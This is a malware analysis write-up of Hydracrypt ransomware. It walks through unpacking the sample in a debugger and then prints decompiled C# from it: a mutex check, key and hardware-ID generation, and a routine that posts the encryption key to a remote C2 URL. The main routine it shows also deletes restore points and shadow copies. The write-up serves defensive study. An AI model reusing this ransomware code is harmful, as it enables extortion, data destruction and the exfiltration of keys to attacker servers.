# Hydracrypt Ransomware

* [Packed Version at ANY.RUN](https://app.any.run/tasks/d233b1e6-5a71-4ff4-b07a-a537e58f9b1c)
* [Unpacked Version at ANY.RUN](https://app.any.run/tasks/d46b69f6-215d-4d04-845d-e208f7674864)

## Unpacking Malware

Here are the file's details :

```
petik@labvx:$ diec -d 446211d2ed10ab785a224abd5e731213af864064dd484cdb74fd5b3b8ebafd10
PE32
    Compiler: EP:Microsoft Visual C/C++(2017 v.15.5-6)[EXE32]
    Compiler: Microsoft Visual C/C++(19.36.32420)[C]
    Linker: Microsoft Linker(14.36.32537)
    Tool: Visual Studio(2022 version 17.6)

petik@labvx:$ diec -e 446211d2ed10ab785a224abd5e731213af864064dd484cdb74fd5b3b8ebafd10
Total 6.86336: packed
  0|PE Header|0|1024|2.65956: not packed
  1|Section(0)['.text']|1024|93184|6.53759: packed
  2|Section(1)['.rdata']|94208|31232|5.29386: not packed
  3|Section(2)['.data']|125440|23040|5.32351: not packed
  4|Section(3)['.reloc']|148480|6144|6.43714: not packed
  5|Section(4)['.kSvT']|154624|50001|5.96039: not packed

Size : 274K
```
To verify that the file is packed correctly, we will check it with x64dbg. To do this, we will set a breakpoint on the VirtualAlloc API.

![bp-virtualalloc](/images/hydracrypt/bp-virtualalloc.png)

We run the program until it stops at the first breakpoint.

![first-bp-alloc](/images/hydracrypt/first-bp-alloc.png)

We will go back to the CPU section and then proceed step by step using the F8 key.

![go-cpu](/images/hydracrypt/go-cpu.png)

There is a call to the VirtualAlloc API.

![end-virtualalloc](/images/hydracrypt/end-virtualloc-01.png)

Following the call to the VirtualAlloc API, we proceed until the end of the call, which is delimited by `ret``

![end-virtualalloc](/images/hydracrypt/end-virtualloc-02.png)

We can do this step by step (F7 or F8) or directly by running until the return (CTRL+F9).

![end-virtualalloc](/images/hydracrypt/end-virtualloc-03.png)

We exit system-level debugging to return to debugging the malware, and we observe interesting elements like:

`[dword ptr ss:[ebp-38]]:"PE"`

This may indicate the presence of the PE (Portable Executable) header.

![continue-after-virtualalloc](/images/hydracrypt/continue-after-virtualalloc.png)

We will check the dump at this address :

![check-dump](/images/hydracrypt/check-dump-pe.png)

We do indeed find a header of a PE Executable (`address 006E0070`).

![pe-header](/images/hydracrypt/pe-header.png)

And when we backtrack, we do have the beginning of an executable with `MZ` (`address 006E0000`).

![mz-header](/images/hydracrypt/mz-header.png)

We will now explore the memory portion.

![follow-in-memory](/images/hydracrypt/follow-in-memory.png)

And we can finally extract the memory dump into a file.

![extract-memory](/images/hydracrypt/extract-memory-01.png)

![extract-memory](/images/hydracrypt/extract-memory-02.png)

So we can now analyze the dump made with DiE.

![analyze-dump](/images/hydracrypt/analyze-dump.png)

```
petik@labvx:$ diec -d 446211d2ed10ab785a224abd5e731213af864064dd484cdb74fd5b3b8ebafd10_006E0000.bin
PE32
    Library: .NET(v4.0.30319)
    Linker: Microsoft Linker

petik@labvx:$ diec -e 446211d2ed10ab785a224abd5e731213af864064dd484cdb74fd5b3b8ebafd10_0006E0000.bin
Total 4.439: not packed
  0|PE Header|0|512|2.58501: not packed
  1|Section(0)['.text']|512|17920|5.43841: not packed
  2|Section(1)['.rsrc']|18432|1536|4.05685: not packed
  3|Section(2)['.reloc']|19968|512|0.0843572: not packed
  4|Overlay|20480|8192|1.66547: not packed

Size 28k
```

## Analyzing Malware

### Mutex process

This part of the malware checks whether another instance of the program is already running using the mutex. This check is based on a unique name for the mutex, which is stored in the mutex variable as "ntyUBXFQTHyHkrn". If another instance with the same mutex name is found, the program exits. Otherwise, it proceeds to execute the Program.Run() method, representing the program's main functionality.

The CreateMutex() method is responsible for creating the mutex with the unique name "ntyUBXFQTHyHkrn" stored in the mutex variable. If the mutex creation is successful, it returns true, indicating that the program can continue execution. If the mutex already exists (another instance is running with the same mutex name), it returns false, and the program exits gracefully.

```csharp
public static void Main(string[] args)
{
    if (!Program.CreateMutex())
    {
        Environment.Exit(0);
        return;
    }
    Program.Run();
}

public static bool CreateMutex()
{
    bool result;
    Program.currentApp = new Mutex(false, Program.mutex, ref result);
    return result;
}

public static string mutex = "ntyUBXFQTHyHkrn";

```

### Main run code

Here is the main part of the program.

```csharp
private static void Run()
{
    try
    {
        Program.password = Program.CreatePassword(50);
        Program.GenerateSalt();
        Program.hwid = Hwid.HWID();
        Program.SendPassword(Program.password, Program.hwid, Program.salti);
        DisableTSK.DisableRegEdit();
        Program.UserFold(Program.password);
        Program.Fix_Drivers(Program.password);
        Program.OtherDrivers(Program.password);
        Program.password = null;
        Program.WriteMessage();
        Program.DeleteRestorePoints();
        Shadow.DelCopy();
        Program.SDel("1");
    }
    catch
    {
    }
}

```
### Password creation

The malware will generate a 50-character password.

```csharp
private static string CreatePassword(int length)
{
    StringBuilder stringBuilder = new StringBuilder();
    Random random = new Random();
    while (0 < Math.Max(Interlocked.Decrement(ref length), length + 1))
    {
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
    }
    return stringBuilder.ToString();
}
```
### HWID Creation

The HWID() method generates a Hardware Identifier (HWID) using certain system information such as the current thread's ID, the username, the machine's name, the operating system version, and the system page size. This method returns the HWID as a string.

The GetHash(string strToHash) method takes an input string, converts it into a 10-character MD5 hash using UTF-8 encoding, and then returns the result in uppercase without dashes.

```csharp
internal class Hwid
{
    public static string HWID()
    {
        string result;
        try
        {
            result = Hwid.GetHash(string.Concat(new object[]
            {
                Environment.CurrentManagedThreadId,
                Environment.UserName,
                Environment.MachineName,
                Environment.OSVersion.VersionString,
                Environment.SystemPageSize
            }));
        }
        catch
        {
            result = "Error HWID";
        }
        return result;
    }

    public static string GetHash(string strToHash)
    {
        string result;
        using (MD5 md = MD5.Create())
        {
            byte[] bytes = Encoding.UTF8.GetBytes(strToHash);
            result = BitConverter.ToString(md.ComputeHash(bytes), 0, 10).Replace("-", "").ToUpper();
        }
        return result;
    }
}
```
The result will be displayed in the ransomware note.

![your-id](/images/hydracrypt/your-id.png)

### Password sending

This part of code defines a method called `SendPassword` that takes three parameters: `password`, `hwid`, and `salt`. The function performs the following operations:

1.  It attempts to perform encryption using the RSACryptoServiceProvider library for both the `password` and `salt` parameters. These data are converted to Base64 strings after encryption.
    
2.  It sets an URL (`address`) to which it will send data. The URL is specifically defined as "[http://a0902054.xsph.ru/one.php](http://a0902054.xsph.ru/one.php)".
    
3.  It uses the WebClient class to send data to the server at the specified URL using a POST request. The data includes the previously encrypted and Base64-encoded `password`, `hwid`, and `salt`.

```csharp
public static void SendPassword(string password, string hwid, string salt)
{
    try
    {
        string value;
        string value2;
        using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider())
        {
            rsacryptoServiceProvider.FromXmlString(Program.publickey);
            value = Convert.ToBase64String(rsacryptoServiceProvider.Encrypt(Encoding.UTF8.GetBytes(password), false));
            value2 = Convert.ToBase64String(rsacryptoServiceProvider.Encrypt(Encoding.UTF8.GetBytes(salt), false));
        }
        string address = Program.gate1;
        using (WebClient webClient = new WebClient())
        {
            NameValueCollection data = new NameValueCollection
            {
                {"Password", value},
                {"Hwid", hwid},
                {"Salt", value2}
            };
            byte[] bytes = webClient.UploadValues(address, "POST", data);
            Encoding.UTF8.GetString(bytes);
        }
    }
    catch
    {
    }
}

public static string gate1 = "http://a0902054.xsph.ru/one.php";

```